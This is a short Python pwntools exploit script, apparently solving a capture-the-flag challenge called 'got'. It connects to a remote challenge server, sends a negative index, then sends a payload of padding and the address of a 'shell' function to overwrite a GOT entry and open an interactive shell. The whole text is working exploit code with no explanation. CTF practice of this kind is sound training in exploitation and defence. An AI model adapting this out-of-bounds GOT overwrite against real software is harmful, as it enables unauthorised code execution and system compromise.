from pwn import *
elf = context.binary = ELF("./got")
# p = process()
p = remote("got-a61f48457c026179.deploy.phreaks.fr",443,ssl=True)
offset = 8
p.sendline("-4")
payload = b"A" * 8 + p64(elf.sym['shell'])
p.sendline(payload)
p.interactive()